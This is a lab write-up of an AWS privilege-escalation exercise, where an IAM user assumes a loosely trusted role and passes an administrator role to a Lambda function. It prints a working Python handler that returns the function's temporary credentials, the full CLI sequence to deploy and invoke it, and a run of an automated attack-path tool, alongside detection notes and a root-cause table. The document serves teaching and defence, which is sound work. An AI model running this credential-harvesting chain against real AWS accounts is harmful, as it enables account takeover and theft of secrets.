---
title: Assume
categories: [HacksmarterLabs]
tags: [aws, iam, aws-lambda, passrole, privilege-escalation, secretsmanager]
media_subpath: /images/hacksmarter_assume/
image:
  path: 'https://images.coursestack.com/15188ee4-104d-438c-ab1a-bb0afe42f5a7/b3aed9a9-8e66-49ac-9a10-51f877dcc27d'
---

## Summary

**Assume** is a HackSmarter AWS scenario. The starting position is a long-lived access key for the IAM user `chris-lab` in AWS account `461837196253`, and the goal is a flag held in AWS Secrets Manager that this user has no permission to read. The whole chain lives at the AWS control plane: there is no web application, no shell on a host, no exploit in the memory-corruption sense. Every step is a documented IAM or STS API call that the account genuinely authorises.

The starter identity carries a single customer-managed policy granting `iam:Get*`, `iam:List*` and `sts:AssumeRole`. The read permissions mean the entire IAM layout, every role and every trust document, is directly readable, so nothing has to be guessed. The `sts:AssumeRole` is the front door the box is named after: `chris-lab` is not privileged in itself, but one role in the account, `cg-lambdaManager-role-lab`, has a trust policy that explicitly names `chris-lab` as an allowed principal. Assuming it is a single API call, and it lands us on a role whose permissions are `lambda:*` plus `iam:PassRole`.

That pairing is a role takeover. `iam:PassRole` scoped to `cg-debug-role-lab` authorises attaching exactly that role to a compute service, and `lambda:*` supplies the compute service. `cg-debug-role-lab` trusts the Lambda service and carries `AdministratorAccess`, so a four-line Python handler that returns its own process environment exfiltrates the role's temporary credentials, and those credentials read the secret directly. The chain composes three conditions:

- A role trust policy that names `chris-lab`, turning `sts:AssumeRole` into a free hop.
- `iam:PassRole` on `cg-debug-role-lab` combined with `lambda:CreateFunction` plus `lambda:InvokeFunction`, which is a full role takeover of a role we cannot assume directly.
- A `cg-debug-role-lab` that both trusts `lambda.amazonaws.com` and holds `AdministratorAccess`, so passing it to Lambda yields administrator.

The second half of the post walks the same account with [AWSPwn](https://github.com/mHijuxS/awspwn), an attack-path tool that enumerates IAM into a graph, runs Dijkstra from the caller to a synthetic `admin` node, and executes the chosen path with credential propagation between hops. It finds the same two-hop route without being told anything about the box, produces two false-positive paths worth understanding, and demonstrates one failure mode that the manual walk never hits: running the tool from the wrong identity.

> **Category:** AWS / IAM privilege escalation. **Starting position:** long-lived access key for `chris-lab`. **Goal:** a Secrets Manager secret the starter identity cannot read. **Theme:** an over-permissive role trust policy hands you a role you were never meant to hold, and that role's `PassRole` plus a compute service turns into administrator.
{: .prompt-info }

---

## 1. Starting Position

The lab hands over an `AKIA` key pair. Write it to a named profile so nothing depends on ambient environment variables:

```bash
mkdir -p ~/.aws
cat > ~/.aws/credentials <<'EOF'
[assume]
aws_access_key_id     = AKIA<REDACTED>
aws_secret_access_key = <REDACTED_SECRET_KEY>
EOF
cat > ~/.aws/config <<'EOF'
[profile assume]
region = us-east-1
output = json
EOF
export AWS_PROFILE=assume AWS_PAGER=""
```

`AWS_PAGER=""` matters more than it looks. AWS CLI v2 pipes JSON through `less` by default, which silently swallows output when the result is consumed non-interactively. It is worth setting once at the top of the session so no later `list-secrets` or `jq` pipeline quietly prints nothing.

The first call for any AWS credential is always the same, because `sts:GetCallerIdentity` cannot be denied by an identity policy and answers for any valid signature:

```bash
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDAWXB5ELPORQM2C4PP2",
    "Account": "461837196253",
    "Arn": "arn:aws:iam::461837196253:user/chris-lab"
}
```

The `AIDA` prefix on the `UserId` confirms this is an IAM user and not an assumed role, and the ARN gives us the account number `461837196253` that every later ARN has to match. The prefix table and the rest of the AWS control-plane groundwork used here live on the [AWS theory page](/theory/misc/aws#credential-types-and-identifier-prefixes).

---

## 2. Enumerating the Starter Identity

An IAM principal's permissions come from four places: attached managed policies, inline policies, group membership, and (for roles) the trust document. Check all of them before concluding anything. The starter identity only has an attached managed policy:

```bash
aws iam list-attached-user-policies --user-name chris-lab
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-chris-policy-lab",
            "PolicyArn": "arn:aws:iam::461837196253:policy/cg-chris-policy-lab"
        }
    ]
}
```

This is a customer-managed policy, not an AWS-managed one, so its document is worth reading in full. A managed policy version cannot be fetched in one call: `get-policy` returns the default version id, and `get-policy-version` returns the document for that version.

```bash
ARN=arn:aws:iam::461837196253:policy/cg-chris-policy-lab
VER=$(aws iam get-policy --policy-arn "$ARN" --query 'Policy.DefaultVersionId' --output text)
aws iam get-policy-version --policy-arn "$ARN" --version-id "$VER" \
  --query 'PolicyVersion.Document'
```

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "iam:Get*",
                "iam:List*",
                "sts:AssumeRole"
            ],
            "Resource": "*"
        }
    ]
}
```

Two capabilities, and they combine into the whole box. `iam:Get*` and `iam:List*` on `*` make every user, role, policy and trust document in the account readable, so the attack surface can be mapped rather than guessed. `sts:AssumeRole` on `*` looks powerful but is only half of a handshake: STS will let `chris-lab` *attempt* to assume any role, but the attempt only succeeds when the target role's own trust policy names `chris-lab` (or a principal that resolves to it) as allowed. The resource wildcard here is our side of the door; the roles' trust policies are the locks.

> **`sts:AssumeRole` on `Resource: "*"` is not, by itself, access to anything.** Role assumption is authorised on both ends: the caller needs `sts:AssumeRole`, and the role needs a trust policy that permits the caller. A pentester holding `sts:AssumeRole` on `*` has a key that fits no lock until enumeration finds a role whose trust document was written too loosely. That role, not the wildcard on our side, is the actual vulnerability.
{: .prompt-info }

So the task reduces to a single question: which role in this account has a trust policy that lets `chris-lab` in?

---

## 3. Finding the Assumable Role

List every role in the account and read each trust document. The identity has `iam:List*` and `iam:Get*`, so a small helper that dumps a role's trust policy plus its attached and inline permission policies keeps the enumeration to one command per role:

```bash
role_enum() {
  local r=$1
  echo "== trust policy (who can assume it):"
  aws iam get-role --role-name "$r" --query 'Role.AssumeRolePolicyDocument'
  echo "== attached managed policies:"
  aws iam list-attached-role-policies --role-name "$r" \
    --query 'AttachedPolicies[].PolicyName'
  echo "== inline policies:"
  aws iam list-role-policies --role-name "$r" --query 'PolicyNames'
}
```

Walking the non-service-linked roles, one trust document stands out. `cg-lambdaManager-role-lab` does not trust an AWS service, it trusts a specific IAM user:

```bash
role_enum cg-lambdaManager-role-lab
```

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::461837196253:user/chris-lab"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

That is the finding. The trust policy names `chris-lab` explicitly, which is exactly the lock our `sts:AssumeRole` key fits. Before assuming it, read what the role is worth. Its attached policy resolves to `lambda:*` and `iam:PassRole`:

```bash
ARN=arn:aws:iam::461837196253:policy/cg-lambdaManager-policy-lab
VER=$(aws iam get-policy --policy-arn "$ARN" --query 'Policy.DefaultVersionId' --output text)
aws iam get-policy-version --policy-arn "$ARN" --version-id "$VER" \
  --query 'PolicyVersion.Document'
```

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "lambda:*",
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": "iam:PassRole",
            "Resource": "arn:aws:iam::461837196253:role/cg-debug-role-lab"
        }
    ]
}
```

The `PassRole` resource is a single specific ARN, `cg-debug-role-lab`, which is the correct way to write the guardrail: it authorises attaching exactly that one role and nothing else. The scoping is right; the problem is what is on the other end of it. Read `cg-debug-role-lab`:

```bash
role_enum cg-debug-role-lab
```

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Service": "lambda.amazonaws.com"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

```json
[
    "AdministratorAccess"
]
```

`cg-debug-role-lab` trusts the Lambda service and carries `AdministratorAccess`. Those two facts are what make it the endpoint of the chain: because it trusts `lambda.amazonaws.com`, the Lambda service is allowed to assume it and run code as it, and because it holds `AdministratorAccess`, that code is administrator.

---

## 4. The Assume-then-PassRole Primitive

Before running anything it is worth being precise about why these actions compose, because the two mechanisms in play, `sts:AssumeRole` and `iam:PassRole`, are constantly confused with each other and they are not the same thing.

**`AssumeRole` gives you a role's credentials.** When `chris-lab` assumes `cg-lambdaManager-role-lab`, STS returns a temporary `ASIA` credential triplet, and every subsequent call made with it is evaluated as the role. This is the first hop, and it works only because that role's trust policy named `chris-lab`.

**`PassRole` gives you none of a role's credentials.** Holding `iam:PassRole` on `cg-debug-role-lab` grants zero of that role's permissions. What it does is authorise *handing the role's ARN to an AWS service* during a create call. The service then assumes the role itself, using the role's own trust policy, and runs your workload under it. `PassRole` exists purely as a guardrail on that handoff: without it, anyone who could create a Lambda, an EC2 instance or an ECS task could attach the most privileged role in the account to it.

The consequence is that `PassRole` is only ever dangerous in combination, and it needs two things to line up. First, the caller must be allowed to pass the target role (`cg-lambdaManager-role-lab` is, but only to `cg-debug-role-lab`). Second, the target role must trust the service you are passing it to, or the service's own `sts:AssumeRole` against it fails. `cg-debug-role-lab` clears both: it is the one role we may pass, and it trusts `lambda.amazonaws.com`. Paired with a compute action that runs attacker-supplied code, that becomes a full role takeover, and Lambda is only one of many such pairings:

| Service action paired with `iam:PassRole` | How the code gets in |
|---|---|
| `lambda:CreateFunction` + `lambda:InvokeFunction` | Function deployment package |
| `ec2:RunInstances` | Instance user-data script |
| `ecs:RunTask` | Container image and command |
| `cloudformation:CreateStack` | Template with a custom resource |
| `glue:CreateDevEndpoint` | Notebook attached to the endpoint |
| `sagemaker:CreateNotebookInstance` | Notebook cell |
| `codebuild:CreateProject` + `codebuild:StartBuild` | Buildspec |

The manager role holds the first row through `lambda:*`. **Why running code inside Lambda equals holding the role:** the Lambda execution environment obtains temporary credentials for the execution role and exposes them to the function process as ordinary environment variables, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN`. This is how the AWS SDKs inside a function pick up their identity with no configuration. It also means a handler that does nothing but read `os.environ` and return it is a complete credential-theft payload, and a synchronous (`RequestResponse`) invocation returns the handler's value straight to the caller. The mechanism is documented in more depth on the [AWS theory page](/theory/misc/aws#passrole--createfunction-is-a-role-takeover).

> There is no exploit here in the vulnerability sense. Every step is the documented, intended behaviour of STS, IAM and Lambda. The compromise is entirely one of policy design: a role trust policy that names an ordinary user, and an `AdministratorAccess` role made passable to a compute service.
{: .prompt-info }

---

## 5. Executing the Chain

### 5.1 Assume the manager role

`sts:AssumeRole` needs the role ARN and a session name, which is a free-text label that ends up in CloudTrail and in the resulting ARN:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::461837196253:role/cg-lambdaManager-role-lab \
  --role-session-name manual
```

```json
{
    "Credentials": {
        "AccessKeyId": "ASIA<REDACTED>",
        "SecretAccessKey": "<REDACTED_SECRET_KEY>",
        "SessionToken": "<REDACTED_SESSION_TOKEN>",
        "Expiration": "2026-08-31T05:00:00+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA<REDACTED>:manual",
        "Arn": "arn:aws:sts::461837196253:assumed-role/cg-lambdaManager-role-lab/manual"
    }
}
```

The `ASIA` prefix marks these as STS temporary credentials, which means the session token is mandatory on every call. Export the triplet and drop the profile, because `AWS_PROFILE` takes precedence over loose environment variables in some resolution orders and is the usual reason a pasted triplet appears not to work:

```bash
unset AWS_PROFILE
export AWS_ACCESS_KEY_ID="ASIA<REDACTED>"
export AWS_SECRET_ACCESS_KEY="<REDACTED_SECRET_KEY>"
export AWS_SESSION_TOKEN="<REDACTED_SESSION_TOKEN>"
aws sts get-caller-identity
```

```json
{
    "UserId": "AROA<REDACTED>:manual",
    "Account": "461837196253",
    "Arn": "arn:aws:sts::461837196253:assumed-role/cg-lambdaManager-role-lab/manual"
}
```

The `arn:aws:sts:` prefix and the `assumed-role/<role>/<session>` form confirm we are now operating as `cg-lambdaManager-role-lab`. The front door the box is named after is now behind us.

### 5.2 The payload

```python
import os
import json

def handler(event, context):
    credentials = {
        "AccessKeyId": os.environ.get("AWS_ACCESS_KEY_ID"),
        "SecretAccessKey": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "SessionToken": os.environ.get("AWS_SESSION_TOKEN"),
    }
    return {
        "statusCode": 200,
        "body": json.dumps(credentials),
    }
```

Three environment reads and a JSON dump. The function needs nothing beyond the standard library, so the deployment package is a single file with no dependencies to vendor. The `statusCode` / `body` shape is the API Gateway proxy response convention; nothing here requires it, but it is why the return value ends up nested and has to be unwrapped twice later. Lambda expects a zip archive, not a bare file:

```bash
zip privesc.zip privesc.py
```

```
  adding: privesc.py (deflated 42%)
```

### 5.3 Deploy the function with the admin role attached

```bash
aws lambda create-function \
  --function-name exploit \
  --role arn:aws:iam::461837196253:role/cg-debug-role-lab \
  --region us-east-1 \
  --handler privesc.handler \
  --zip-file fileb://privesc.zip \
  --runtime python3.11
```

Each flag earns its place:

- `--role` is the `PassRole` moment. The service validates that our caller is allowed to pass this specific ARN, then stores it as the function's execution role. This is the call the `iam:PassRole` statement from section 3 authorises, and it would fail with `AccessDenied` for any role other than `cg-debug-role-lab`.
- `--handler privesc.handler` is `<module>.<function>`: the file `privesc.py` inside the zip, and the `handler` symbol within it. A mismatch here produces a runtime `Unable to import module` error rather than a create-time failure.
- `--zip-file fileb://` uploads the archive inline. The `fileb://` scheme (rather than `file://`) reads the file as binary; `file://` would try to interpret it as text and corrupt it.
- `--runtime python3.11` selects a managed runtime, so nothing has to be built or containerised.

```json
{
    "FunctionName": "exploit",
    "FunctionArn": "arn:aws:lambda:us-east-1:461837196253:function:exploit",
    "Runtime": "python3.11",
    "Role": "arn:aws:iam::461837196253:role/cg-debug-role-lab",
    "Handler": "privesc.handler",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip"
}
```

Note `"State": "Pending"`. `create-function` returns before the function is invocable, and invoking too early fails with `ResourceConflictException: ... The function is currently in the following state: Pending`. That is a timing artefact, not a permissions problem, and the fix is to wait for the function to go active:

```bash
aws lambda wait function-active --function-name exploit --region us-east-1
```

### 5.4 Invoke and unwrap

```bash
aws lambda invoke --function-name exploit response.json --region us-east-1
```

```json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

The `StatusCode` here is the HTTP status of the *invocation*, not of the handler. A handler that raised an exception would still return `200`, with a `FunctionError` field alongside it, so this response says only that the function ran. The interesting part went to the output file. The handler's return value is JSON, and its `body` is itself a JSON string, so it needs unwrapping twice:

```bash
jq -r '.body' response.json | jq '.'
```

```json
{
  "AccessKeyId": "ASIA<REDACTED>",
  "SecretAccessKey": "<REDACTED_SECRET_KEY>",
  "SessionToken": "<REDACTED_SESSION_TOKEN>"
}
```

The `ASIA` prefix confirms these are the temporary credentials of `cg-debug-role-lab`, harvested from inside the running function. Export them, replacing the manager-role session:

```bash
export AWS_ACCESS_KEY_ID="ASIA<REDACTED>"
export AWS_SECRET_ACCESS_KEY="<REDACTED_SECRET_KEY>"
export AWS_SESSION_TOKEN="<REDACTED_SESSION_TOKEN>"
aws sts get-caller-identity
```

```json
{
    "UserId": "AROA<REDACTED>:exploit",
    "Account": "461837196253",
    "Arn": "arn:aws:sts::461837196253:assumed-role/cg-debug-role-lab/exploit"
}
```

The `assumed-role/cg-debug-role-lab/exploit` ARN names the role we are now operating as, and the `:exploit` session suffix is the one Lambda derives from the function name. We hold the admin role's credentials without ever having been allowed to assume it directly.

### 5.5 Confirm what the role is worth

This was already read during enumeration in section 3, but it is worth confirming there is nothing left to escalate to:

```bash
aws iam list-attached-role-policies --role-name cg-debug-role-lab \
  --query 'AttachedPolicies[].PolicyName'
```

```json
[
    "AdministratorAccess"
]
```

`AdministratorAccess` is `Action: "*"` on `Resource: "*"`. This is the whole account.

---

## 6. Reading the Secret

```bash
aws secretsmanager list-secrets --region us-east-1
```

```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:461837196253:secret:cg-flag-lab-TrP6Rn",
            "Name": "cg-flag-lab",
            "Description": "CloudGoat flag secret",
            "SecretVersionsToStages": {
                "terraform-vSzazAJOIdcgSBPBSM4a1MGuyx": [
                    "AWSCURRENT"
                ]
            }
        }
    ]
}
```

The six-character suffix on the ARN (`-TrP6Rn`) is generated by Secrets Manager at creation time and is not predictable, which is why `list-secrets` is a necessary step rather than a convenience. `get-secret-value` accepts the friendly `Name` too, but the full ARN removes all ambiguity:

```bash
aws secretsmanager get-secret-value \
  --region us-east-1 \
  --secret-id arn:aws:secretsmanager:us-east-1:461837196253:secret:cg-flag-lab-TrP6Rn
```

```json
{
    "ARN": "arn:aws:secretsmanager:us-east-1:461837196253:secret:cg-flag-lab-TrP6Rn",
    "Name": "cg-flag-lab",
    "VersionId": "terraform-vSzazAJOIdcgSBPBSM4a1MGuyx",
    "SecretString": "HSM{redacted}",
    "VersionStages": [
        "AWSCURRENT"
    ]
}
```

The Secrets Manager mechanics used here are covered on the [AWS theory page](/theory/misc/aws#secrets-manager).

> **This is the cheapest step in the chain to detect.** `GetSecretValue` writes a CloudTrail event carrying the secret ARN, the calling principal and the source IP, and it bumps the secret's `LastAccessedDate`. It does not log the secret value. A Lambda execution role reading a flag secret from an operator's IP, in a session named after a function created moments earlier, is a low-noise, high-confidence alert. So is the pair that precedes it: an `sts:AssumeRole` onto `cg-lambdaManager-role-lab` immediately followed by `CreateFunction` passing an administrator role.
{: .prompt-danger }

---

## 7. Automating It: AWSPwn

Everything above is a graph problem in disguise. Nodes are principals; an edge from A to B means "holding A, there is an API call that yields B's credentials or privileges". `CanAssume` is an edge from `chris-lab` to `cg-lambdaManager-role-lab`, drawn straight from the trust policy. `CreateLambdaWithRole` is an edge from the manager role to the roles it can pass. Finding the chain is then a shortest-path search, the same insight BloodHound applies to Active Directory.

[AWSPwn](https://github.com/mHijuxS/awspwn) implements that for AWS: it enumerates IAM and regional resources into a graph, scores each edge by blast radius, runs Dijkstra from the caller to a synthetic `admin` node, and then walks the chosen path in-process with boto3, propagating credentials from one hop to the next. Load the starter key and hand control to the tool:

```bash
eval "$(hsmcli lab assume creds --export)"
awspwn pwn --execute
```

```
  version 0.1.0   phase-3 exploitation - mutates the account
  automated exploitation - credential propagation + rollback ledger

  [*] no saved graph - collecting fresh (enum)...

  [+] authenticated as arn:aws:iam::461837196253:user/chris-lab
  [*] account 461837196253
  [*] sweeping 8 region(s)
  [*] running 10 enumerator(s)...


  Paths from chris-lab:

    1. (cost 3, 2 hop) -> cg-debug-role-lab
        CanAssume -> CreateLambdaWithRole
    2. (cost 3, 2 hop) -> CourseStackAwsLabRole
        CanAssume -> CreateLambdaWithRole
    3. (cost 3, 2 hop) -> OrganizationAccountAccessRole
        CanAssume -> CreateLambdaWithRole
    4. (cost 5, 3 hop) -> admin
        CanAssume -> CreateLambdaWithRole -> EffectiveAdmin

  Select a path [1-4] (q to quit): 1
```

The costs are worth reading rather than skipping. Edge cost is a base weight plus a blast-radius surcharge. `CanAssume` is a `READ` edge, so it carries no mutate surcharge and costs 1; `CreateLambdaWithRole` is a `MUTATE` edge and costs 2. That is why the two-hop paths here come to `cost 3`, one less than the equivalent chains in scenarios that open with a mutating first hop such as `CreateAccessKey`. The surcharge is what makes the ranking useful: `DESTRUCTIVE` and `EXTERNAL_EXPOSURE` edges add more, so the search prefers the quietest route to admin, not merely the shortest.

Path 4 is the same chain with one more edge: `EffectiveAdmin` is a synthetic edge from any principal whose effective policy is wildcard-admin to a synthetic `admin` goal node, which is how "did we win" gets expressed as a graph query.

### 7.1 The walk

```
  -- hop 1/2: CanAssume -> cg-lambdaManager-role-lab  [READ]
  [+] now: arn:aws:sts::461837196253:assumed-role/cg-lambdaManager-role-lab/awspwn

  -- hop 2/2: CreateLambdaWithRole -> cg-debug-role-lab  [MUTATE]
    [+] deployed awspwn-exploit-9f29ccf1 as arn:aws:iam::461837196253:role/cg-debug-role-lab
    [cleanup] deleted awspwn-exploit-9f29ccf1 (as creator)
    [+] captured credentials for arn:aws:iam::461837196253:role/cg-debug-role-lab
  [+] now: arn:aws:iam::461837196253:role/cg-debug-role-lab

------------------------------------------------------------------------------
  Result: REACHED GOAL   2/2 hop(s)   final identity: arn:aws:iam::461837196253:role/cg-debug-role-lab
  Mutations recorded: 1  (awspwn rollback to undo)
  Captured credentials (secrets saved 0600 -> awspwn-loot/captured-creds.jsonl):
    * arn:aws:iam::461837196253:role/cg-debug-role-lab  (lambda-exec)  key ASIA<REDACTED>
```

Every line maps back to the manual walk. Hop 1 is the `sts:AssumeRole` from section 5.1, tagged `[READ]` because assuming a role mutates nothing. Hop 2 is `create-function` plus `invoke` plus the environment-variable exfiltration from sections 5.2 through 5.4, collapsed into one `[MUTATE]` step. `Mutations recorded: 1` is a ledger of exactly one mutating call, the `CreateFunction`, and `awspwn rollback` replays it to delete anything the run left behind, which matters on an engagement where the deliverable includes proving the account was returned to its prior state. The tool never had the role names handed to it; the same graph query that ranks paths also identifies which trust policy and which `PassRole` scope actually lead anywhere.

### 7.2 Where the graph model overstates the account

Paths 2 and 3 offered `CourseStackAwsLabRole` and `OrganizationAccountAccessRole` as `CreateLambdaWithRole` targets, ranked identically to the real path at `cost 3`. Neither is reachable. Two independent guardrails block them, and the manual enumeration in section 3 saw both:

- The manager role's `iam:PassRole` is scoped to the single ARN `cg-debug-role-lab`, so `create-function` passing either of the other two fails with `AccessDenied` on `iam:PassRole`.
- `CourseStackAwsLabRole` and `OrganizationAccountAccessRole` are CourseStack platform-management roles present in every lab account. Their trust policies name the platform and the organisation's management account, not `lambda.amazonaws.com`, so even a caller allowed to pass them could not get Lambda to assume them.

The graph draws an edge anyway because its edge builder keys on *which action a principal holds*, not on the resource ARN that action is scoped to nor on the target's trust policy. `iam:PassRole` present anywhere in a policy becomes a `CreateLambdaWithRole` edge to every non-service-linked role in the account. That is a deliberate recall-over-precision trade: a missed edge is a missed attack path, whereas a false edge costs one failed API call. It is also why the seven `AWSServiceRoleFor*` roles never appear as candidates, because service-linked roles genuinely cannot be passed to arbitrary compute.

> **Every attack-path tool over-approximates somewhere, and knowing where is the difference between using one and trusting one.** BloodHound's AD collectors do the same with ACEs whose effect depends on runtime state. When a graph tool offers several interchangeable-looking paths, read the underlying trust and resource policies for the one you intend to run rather than picking by cost, and treat the ranking as a search-order hint, not a claim of feasibility.
{: .prompt-warning }

### 7.3 Running the tool from the wrong identity

A subtle failure mode is worth showing, because it is easy to trip over. After the walk, the shell is still loaded with the captured `cg-debug-role-lab` credentials. Running `awspwn pwn --execute` again appears to work, but it replays the *cached* graph, which was collected as `chris-lab` and still shows the same four paths from that user:

```bash
awspwn pwn --execute
```

```
  Paths from chris-lab:

    1. (cost 3, 2 hop) -> cg-debug-role-lab
        CanAssume -> CreateLambdaWithRole
   ...
  Select a path [1-4] (q to quit): q
```

Forcing a fresh enumeration with `--no-cache` re-collects the graph as the *current* identity, the `cg-debug-role-lab` session, and the result is the honest one:

```bash
awspwn pwn --execute --no-cache
```

```
  [*] --no-cache - collecting fresh (enum)...

  [+] authenticated as arn:aws:sts::461837196253:assumed-role/cg-debug-role-lab/awspwn-exploit-9f29ccf1
  [*] account 461837196253
  [*] running 10 enumerator(s)...

  [!] No path found from awspwn-exploit-9f29ccf1.
```

There is no path because there is nowhere left to go: the current identity is already an administrator, which is the goal the search is trying to reach. The graph is always relative to the caller, and a cached graph is relative to *whoever collected it*. Once you have pivoted, either re-enumerate with `--no-cache` or reason from the identity you actually hold; the cache will otherwise keep answering a question about a user you are no longer using.

### 7.4 Loading the captured credentials and reading the secret

The loot store keeps captured credentials as JSONL at mode `0600`, and `--export` renders one of them as shell assignments that must be evaluated by the current shell, not run as a command:

```bash
eval "$(awspwn loot --export cg-debug-role-lab)"
```

```
# awspwn: loaded role-creds for cg-debug-role-lab (account 461837196253) [session token - ephemeral; re-capture if expired]
```

From there the last two calls are identical to section 6:

```bash
aws secretsmanager list-secrets --region us-east-1
aws secretsmanager get-secret-value \
  --region us-east-1 \
  --secret-id arn:aws:secretsmanager:us-east-1:461837196253:secret:cg-flag-lab-TrP6Rn
```

```json
{
    "Name": "cg-flag-lab",
    "VersionId": "terraform-vSzazAJOIdcgSBPBSM4a1MGuyx",
    "SecretString": "HSM{redacted}",
    "VersionStages": [
        "AWSCURRENT"
    ]
}
```

Same flag, a manual chain of five distinct API calls replaced by one command and a menu selection.

---

## Understanding the Attack Chain

Not one step in this chain is a bug. Every call is an AWS API behaving exactly as documented, invoked by a principal the account explicitly authorised. The compromise is entirely in the arrangement, and the table below separates what each piece is worth on its own from what it is worth in sequence.

| Primitive | Where it lives | Severity in isolation | Severity composed |
|---|---|---|---|
| `iam:Get*` / `iam:List*` | `cg-chris-policy-lab`, managed | Low: metadata only, no writes | Publishes the whole attack graph for free |
| `sts:AssumeRole` on `*` | `cg-chris-policy-lab`, managed | None: a key that fits no lock | Becomes the first hop once a trust names us |
| Trust policy naming `chris-lab` | `cg-lambdaManager-role-lab` | Medium: one user can assume it | Hands us a role we were never meant to hold |
| `lambda:*` | `cg-lambdaManager-role-lab` | Low: manage functions | Supplies the compute that runs as the role |
| `iam:PassRole`, correctly scoped | `cg-lambdaManager-role-lab` | None on its own: no credentials | Authorises attaching the admin role |
| Role creds in the runtime environment | Lambda by design | None: how SDKs authenticate | Four lines of Python exfiltrate them |
| Trust for `lambda.amazonaws.com` | `cg-debug-role-lab` | None: a normal service trust | Lets Lambda run our code as this role |
| `AdministratorAccess` on that role | `cg-debug-role-lab` | Critical, but "only" for Lambda | The whole account, via a passable role |
| `secretsmanager:GetSecretValue` | Inherited via the role | Normal application design | The final read |
